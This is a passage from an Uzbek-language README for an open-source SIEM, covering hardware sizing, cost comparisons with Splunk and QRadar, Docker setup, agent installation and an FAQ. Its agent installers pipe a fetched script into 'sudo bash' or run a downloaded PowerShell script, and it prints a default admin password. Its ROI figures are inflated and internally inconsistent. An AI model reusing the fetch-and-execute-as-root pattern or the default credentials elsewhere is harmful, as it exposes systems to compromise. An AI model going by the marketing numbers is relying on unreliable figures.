| Alerts | Alertmanager | latest | Alert routing |
| Graphs | Grafana | latest | Vizualizatsiya |
| Container | Docker Compose | latest | Barcha servislar |

### Server talablari

```
Minimal (test uchun):
  RAM:  8 GB
  CPU:  4 yadro
  Disk: 100 GB SSD

Tavsiya (100 agent, 10K log/soat):
  RAM:  16 GB
  CPU:  8 yadro
  Disk: 500 GB SSD (NVMe)

Enterprise (500+ agent, 1M+ log/kun):
  RAM:  32 GB+
  CPU:  16 yadro+
  Disk: 2 TB+ (Elasticsearch alohida 3-node cluster)
  Load balancer, PostgreSQL replikatsiya, Redis Sentinel
```

---

## 💼 Biznes Foydasi

### Moliyaviy taqqos

```
┌────────────────────────┬──────────────────────────────────┐
│  Tijorat SIEM          │  SecureWatch SIEM                │
├────────────────────────┼──────────────────────────────────┤
│  Splunk Enterprise:    │  O'z serveringizda:              │
│  $50,000–$150,000/yil  │  Bepul (server narxi istisno)   │
│                        │                                  │
│  IBM QRadar:           │  Cheksiz:                        │
│  $70,000–$200,000/yil  │  • Agentlar soni                │
│                        │  • Log hajmi                    │
│  Litsenziya:           │  • Foydalanuvchilar             │
│  + agent başına to'lov │  • Custom qoidalar              │
│  + GB başına to'lov    │  • API integratsiya             │
│  + modul to'lovlari    │                                  │
└────────────────────────┴──────────────────────────────────┘
```

### Vaqt tejash

| Jarayon | Avval (qo'lda) | SecureWatch bilan |
|---------|----------------|-------------------|
| Brute force aniqlash | 30-60 daqiqa | **< 60 sekund** |
| IP bloklash | 15-20 daqiqa | **Avtomatik (< 5 sek)** |
| Log qidiruv (1 soatlik) | 30-60 daqiqa | **< 1 sekund** |
| Compliance hisobot | 2-3 ish kuni | **Bir tugma (daqiqalar)** |
| Zaiflik tekshiruvi | Haftalik qo'lda | **Kunlik avtomatik** |
| Insidentga javob | 1-2 soat | **Darhol (active response)** |

### Xavf kamaytirish

```
DWELL TIME (hujumchi tizimda qolish vaqti):
  Sanoat o'rtacha:        197 kun
  SecureWatch bilan:      < 1 soat (real vaqt aniqlash)

  197 kun × $4,450/kun potentsial zarar = $876,650
  1 soat  × $4,450/kun = $185 (97% tejash!)

IBM Data Breach Report 2024:
  O'rtacha data breach narxi:     $4.45 million
  Erta aniqlash discounti:        35% kamayishi
  SecureWatch bilan potentsial tejash: $1.56 million

ROI (Return on Investment):
  SecureWatch setup xarajati:  ~$5,000 (server + sozlash)
  Bitta breach oldini olish:   $4.45 million
  ROI:                         88,900%
```

---

## 📊 Raqobatchilar Bilan Taqqoslash

```
┌──────────────────┬──────────┬──────────┬──────────┬────────────────┐
│  Xususiyat       │ Splunk   │ QRadar   │ Wazuh    │ SecureWatch    │
├──────────────────┼──────────┼──────────┼──────────┼────────────────┤
│  Narx (yillik)   │ $150K+   │ $200K+   │ Bepul*   │ ✅ Bepul       │
│  O'rnatish       │ 2-4 hafta│ 2-4 hafta│ 1-2 hafta│ ✅ 5 daqiqa    │
│  UI sifati       │ Yaxshi   │ O'rta    │ Yaxshi   │ ✅ Zamonaviy   │
│  Active Response │ Qo'shimcha│ Ha       │ Ha       │ ✅ Ha          │
│  Anomaliya       │ ML (pul) │ Ha       │ Ha       │ ✅ Ha (bepul)  │
│  Windows agent   │ Ha       │ Ha       │ Ha**     │ ✅ Ha          │
│  Docker native   │ O'rta    │ O'rta    │ O'rta    │ ✅ To'liq      │
│  Case mgmt       │ Pullik   │ Ha       │ Yo'q     │ ✅ Ha (bepul)  │
│  2FA/TOTP        │ Pullik   │ Ha       │ Pullik   │ ✅ Ha (bepul)  │
│  API docs        │ Ha       │ O'rta    │ O'rta    │ ✅ /docs       │
│  Manba kodi      │ Yopiq    │ Yopiq    │ Ochiq    │ ✅ Ochiq       │
│  Redis Pub/Sub   │ Yo'q     │ Yo'q     │ Yo'q     │ ✅ Ha          │
│  Welford anomaly │ Yo'q     │ Yo'q     │ Yo'q     │ ✅ Ha          │
└──────────────────┴──────────┴──────────┴──────────┴────────────────┘

* Wazuh bepul ammo enterprise qo'shimcha xizmatlar pullik
** Wazuh Windows agent'da pywin32 DLL muammolari bo'lishi mumkin
```

---

## 📦 O'rnatish Qo'llanmasi

### Talab qilinadigan dasturlar

```bash
# Linux serverda tekshirish:
docker --version     # Docker 20.10+
docker compose version  # Docker Compose 2.0+
git --version        # Git 2.x+

# O'rnatish (Ubuntu/Debian):
sudo apt update
sudo apt install -y docker.io docker-compose-plugin git
sudo usermod -aG docker $USER
```

### Bosqichma-bosqich o'rnatish

```bash
# ─── 1-QADAM: Kodni yuklab olish ──────────────────────────────
git clone https://github.com/DiorDevv/SIEM.git
cd SIEM

# ─── 2-QADAM: Muhit sozlamalari ───────────────────────────────
cp .env.example .env

# ─── 3-QADAM: Maxfiy kalitlar yaratish ────────────────────────
echo "SECRET_KEY=$(python3 -c "import secrets; print(secrets.token_hex(32))")"
echo "POSTGRES_PASSWORD=$(python3 -c "import secrets; print(secrets.token_hex(16))")"
echo "REDIS_PASSWORD=$(python3 -c "import secrets; print(secrets.token_hex(16))")"
echo "ELASTIC_PASSWORD=$(python3 -c "import secrets; print(secrets.token_hex(16))")"

# ─── 4-QADAM: .env faylini tahrirlash ─────────────────────────
nano .env
# Yuqoridagi kalitlarni to'ldiring:
# SECRET_KEY=<yuqorida yaratilgan>
# POSTGRES_PASSWORD=<yuqorida yaratilgan>
# REDIS_PASSWORD=<yuqorida yaratilgan>
# ELASTIC_PASSWORD=<yuqorida yaratilgan>

# ─── 5-QADAM: Ishga tushirish ─────────────────────────────────
docker compose up -d --build

# ─── 6-QADAM: Holat tekshirish ────────────────────────────────
docker compose ps
# Barcha servislar "Up" bo'lishi kerak

# ─── 7-QADAM: Loglarni ko'rish ────────────────────────────────
docker compose logs -f backend
# "Application startup complete." ko'rsangiz tayyor!
```

### Saytga kirish

```
Dashboard:   http://sizning-server-IP:8080
Default login:
  Username: admin
  Password: Admin@SIEM2024!
  (Birinchi kirishda ALBATTA o'zgartiring!)

Monitoring:
  Grafana:     http://sizning-server-IP:3001
  Prometheus:  http://sizning-server-IP:9090
  Alertmanager:http://sizning-server-IP:9093
```

### Agent O'rnatish

**Linux:**
```bash
# Bir buyruq bilan o'rnatish:
curl -fsSL "http://SIEM-SERVER:8080/api/installer/linux?\
manager_url=http://SIEM-SERVER:8080&\
agent_name=web-server-01&\
agent_secret=SIZNING-MAXFIY-KALIT" | sudo bash

# Holat tekshirish:
sudo systemctl status siem-agent
sudo journalctl -u siem-agent -f
```

**Windows (PowerShell, Administrator sifatida):**
```powershell
# O'rnatish:
$url = "http://SIEM-SERVER:8080/api/installer/windows?" +
       "manager_url=http://SIEM-SERVER:8080&" +
       "agent_name=my-pc&" +
       "agent_secret=SIZNING-MAXFIY-KALIT"
Invoke-WebRequest $url -UseBasicParsing -OutFile "$env:TEMP\Install-SIEMAgent.ps1"
& "$env:TEMP\Install-SIEMAgent.ps1"

# Holat tekshirish:
Get-ScheduledTask -TaskName "SIEMAgent"
Get-Content "C:\Program Files\SIEMAgent\agent.log" -Tail 50
```

**macOS:**
```bash
# O'rnatish:
curl -fsSL "http://SIEM-SERVER:8080/api/installer/macos?\
manager_url=http://SIEM-SERVER:8080&\
agent_name=my-mac&\
agent_secret=SIZNING-MAXFIY-KALIT" | sudo bash

# Holat tekshirish:
sudo launchctl list | grep siem
sudo tail -f /var/log/siem-agent.log
```

### Keng Tarqalgan Muammolar

```
Problem: docker compose ps — ba'zi servis "Restarting"
Yechim:
  docker compose logs <servis-nomi>
  # Xatolikni o'qing va hal qiling

Problem: Backend ishga tushmaydi — "SECRET_KEY is required"
Yechim:
  .env fayliga SECRET_KEY qo'shing

Problem: Elasticsearch "Restarting"
Yechim:
  # vm.max_map_count kamroq bo'lishi mumkin:
  sudo sysctl -w vm.max_map_count=262144
  echo "vm.max_map_count=262144" | sudo tee -a /etc/sysctl.conf

Problem: Saytga kira olmayman
Yechim:
  # Firewall tekshirish:
  sudo ufw status
  sudo ufw allow 8080/tcp
  sudo ufw allow 8443/tcp
  
  # Docker port tekshirish:
  docker compose ps | grep nginx
```

---

## ❓ Tez-tez So'raladigan Savollar

**Q: SIEM qanchalik server ta'sir qiladi?**
A: Agent CPU'ni < 0.5%, RAM'ni < 256MB ishlatadi. Asosiy tizim ishlashiga ta'sir qilmaydi.

**Q: Internet bo'lmasa nima bo'ladi?**
A: Agent SQLite buferga yozadi. Internet qaytganda barcha ma'lumot yuboriladi. Hech narsa yo'qolmaydi.

**Q: Nechta agent qo'shsa bo'ladi?**
A: Cheklov yo'q. 8GB RAM server 100+ agentni boshqara oladi.

**Q: Loglar qancha vaqt saqlanadi?**
A: Default 90 kun. .env'da LOG_RETENTION_DAYS o'zgartirish mumkin.

**Q: HTTPS qanday yoqiladi?**
A: SSL sertifikat oling (Let's Encrypt bepul), nginx.conf'ga qo'shing va HTTP→HTTPS redirect yoqing.

**Q: Qoidani test qilsa bo'ladimi?**
A: Ha. Rules sahifasida "Test" tugmasi bor. Haqiqiy log matni kiritib qoidani sinab ko'rish mumkin.

**Q: 2FA yo'qolsa nima bo'ladi?**
A: Backup kodlar bilan kirish mumkin. Ular Settings → 2FA sahifasida ko'rsatiladi va faqat bir marta ishlatiladi.

**Q: Windows agent Task Scheduler'da ishlaydi, Windows Service emas. Nega?**
A: pywin32 kutubxonasi (Windows Service uchun zarur) turli Windows versiyalarida DLL muammolari keltirib chiqaradi. Task Scheduler tashqi kutubxona talab qilmaydi va barcha Windows versiyalarida ishonchli ishlaydi.

**Q: Elasticsearch'ni alohida serverga ko'chirsam bo'ladimi?**
A: Ha. docker-compose.yml'da elasticsearch servisini o'chiring va backend .env'da ELASTICSEARCH_URL=http://boshqa-server:9200 qo'ying.

---

<div align="center">

---

```
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║   SecureWatch SIEM — Xavfsizlik hech qachon uxlamaydi     ║
║                                                           ║
║   GitHub: https://github.com/DiorDevv/SIEM                ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
```

**Versiya:** 4.0.0 &nbsp;|&nbsp; **Sana:** 2026 &nbsp;|&nbsp; **Litsenziya:** MIT

</div>
